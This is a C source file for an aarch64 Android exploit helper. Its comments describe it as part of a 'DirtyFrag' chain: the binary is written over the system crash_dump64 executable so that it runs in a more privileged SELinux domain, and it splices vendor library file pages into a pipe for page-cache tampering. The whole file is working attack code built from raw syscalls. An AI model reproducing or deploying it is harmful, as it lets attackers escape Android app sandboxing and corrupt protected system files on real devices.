/*
 * splicehelper.c - bare-syscall static helper (no libc, no libc start files).
 *
 * Role in the chain (DirtyFrag architecture):
 *   The engine overwrites /apex/com.android.runtime/bin/crash_dump64 with this
 *   binary. crash_dump64 runs in the crash_dump SELinux domain, which can read
 *   vendor_file content the untrusted_app domain cannot - so it acts as the
 *   read/splice bridge for files such as /vendor/lib64/libbinderdebug.so.
 *
 * argv contract:
 *   splicehelper <offset> <file_path> <mode>
 *     mode "r": openat -> lseek -> read 16 bytes -> verify fd 0 is a pipe ->
 *               write the 16 bytes to fd 0
 *     default : splice 16 bytes of the file page (at offset) into fd 1
 *               (fd 1 must be a pipe; the pipe buffer then holds a reference
 *               to the file's page-cache page)
 *
 * Built with:
 *   -nodefaultlibs -nostartfiles -ffreestanding -static
 * All kernel interaction goes through raw svc #0 syscalls (aarch64 ABI).
 */

#define AT_FDCWD       (-100L)
#define O_RDONLY       0L
#define O_WRONLY       1L
#define SEEK_SET       0L
#define SPLICE_F_MOVE  1L

#define SYS_OPENAT     56L
#define SYS_CLOSE      57L
#define SYS_LSEEK      62L
#define SYS_READ       63L
#define SYS_WRITE      64L
#define SYS_SPLICE     76L
#define SYS_FSTAT      80L
#define SYS_EXIT_GROUP 94L

/* aarch64 generic struct stat (asm-generic/stat.h) */
struct kstat {
    unsigned long long st_dev;
    unsigned long long st_ino;
    unsigned int       st_mode;
    unsigned int       st_nlink;
    unsigned int       st_uid;
    unsigned int       st_gid;
    unsigned long long st_rdev;
    unsigned long long __pad1;
    long long          st_size;
    int                st_blksize;
    int                __pad2;
    long long          st_blocks;
    long long          st_atime;
    long long          st_atime_nsec;
    long long          st_mtime;
    long long          st_mtime_nsec;
    long long          st_ctime;
    long long          st_ctime_nsec;
    unsigned int       __unused4;
    unsigned int       __unused5;
};

static inline long sys_call3(long n, long a, long b, long c)
{
    register long x8 __asm__("x8") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    __asm__ volatile ("svc #0"
                      : "=r"(x0)
                      : "r"(x8), "0"(x0), "r"(x1), "r"(x2)
                      : "memory", "cc");
    return x0;
}

static inline long sys_call6(long n, long a, long b, long c, long d, long e, long f)
{
    register long x8 __asm__("x8") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    register long x3 __asm__("x3") = d;
    register long x4 __asm__("x4") = e;
    register long x5 __asm__("x5") = f;
    __asm__ volatile ("svc #0"
                      : "=r"(x0)
                      : "r"(x8), "0"(x0), "r"(x1), "r"(x2), "r"(x3), "r"(x4),
                        "r"(x5)
                      : "memory", "cc");
    return x0;
}

static inline long sys_call4(long n, long a, long b, long c, long d)
{
    register long x8 __asm__("x8") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    register long x3 __asm__("x3") = d;
    __asm__ volatile ("svc #0"
                      : "=r"(x0)
                      : "r"(x8), "0"(x0), "r"(x1), "r"(x2), "r"(x3)
                      : "memory", "cc");
    return x0;
}

static long sc_openat_real(long dirfd, const char *path, long flags, long mode)
{
    return sys_call4(SYS_OPENAT, dirfd, (long)path, flags, mode);
}

static long sc_close(long fd)                     { return sys_call3(SYS_CLOSE, fd, 0, 0); }
static long sc_lseek(long fd, long off, long wh)  { return sys_call3(SYS_LSEEK, fd, off, wh); }
static long sc_read(long fd, void *buf, long n)   { return sys_call3(SYS_READ, fd, (long)buf, n); }
static long sc_write(long fd, const void *b, long n) { return sys_call3(SYS_WRITE, fd, (long)b, n); }
static long sc_fstat(long fd, struct kstat *st)   { return sys_call3(SYS_FSTAT, fd, (long)st, 0); }

static long sc_splice(long fd_in, long long *off_in, long fd_out,
                      long long *off_out, long len, long flags)
{
    return sys_call6(SYS_SPLICE, fd_in, (long)off_in, fd_out, (long)off_out,
                     len, flags);
}

static void __attribute__((noreturn)) sc_exit(int code)
{
    sys_call3(SYS_EXIT_GROUP, code, 0, 0);
    for (;;)
        ;
}

/* Minimal decimal parser (offsets fit in long; no negative offsets used). */
static long parse_long(const char *s)
{
    long v = 0;
    while (*s >= '0' && *s <= '9') {
        v = v * 10 + (*s - '0');
        s++;
    }
    return v;
}

#define S_IFMT  0170000
#define S_IFIFO 0010000

/* Engine entry (_start) branches straight here; the asm symbol reference
 * makes clang keep it. Non-static so the naked _start branch resolves. */
void helper_main(long argc, char **argv)
{
    long off, fd, n, ret = 1;
    unsigned char buf[16];

    if (argc < 4)
        sc_exit(1);

    off  = parse_long(argv[1]);
    const char *path = argv[2];
    char mode = argv[3][0];

    if (mode == 'r') {
        /* read 16 bytes at offset, hand them back over fd 0 (a pipe) */
        struct kstat st;

        fd = sc_openat_real(AT_FDCWD, path, O_RDONLY, 0);
        if (fd < 0)
            sc_exit(2);
        if (sc_lseek(fd, off, SEEK_SET) != off) {
            sc_close(fd);
            sc_exit(3);
        }
        n = sc_read(fd, buf, 16);
        sc_close(fd);
        if (n != 16)
            sc_exit(4);

        if (sc_fstat(0, &st) < 0)
            sc_exit(5);
        if ((st.st_mode & S_IFMT) != S_IFIFO)
            sc_exit(5);

        if (sc_write(0, buf, 16) != 16)
            sc_exit(6);
        sc_exit(0);
    }

    /* default mode: splice 16 bytes of the file page into fd 1 */
    fd = sc_openat_real(AT_FDCWD, path, O_RDONLY, 0);
    if (fd < 0)
        sc_exit(2);
    {
        long long off_in = off;
        n = sc_splice(fd, &off_in, 1 /* fd1: pipe write end */, 0, 16,
                      SPLICE_F_MOVE);
    }
    sc_close(fd);
    if (n != 16)
        ret = 7;
    else
        ret = 0;
    sc_exit((int)ret);
}

/*
 * Process entry point with no libc: sp[0] = argc, sp[8..] = argv[].
 * Branch straight into helper_main and never return.
 */
__attribute__((naked)) void _start(void)
{
    __asm__ volatile (
        "ldr x0, [sp]\n"        /* argc                          */
        "add x1, sp, #8\n"      /* argv                          */
        "b helper_main\n"
    );
}
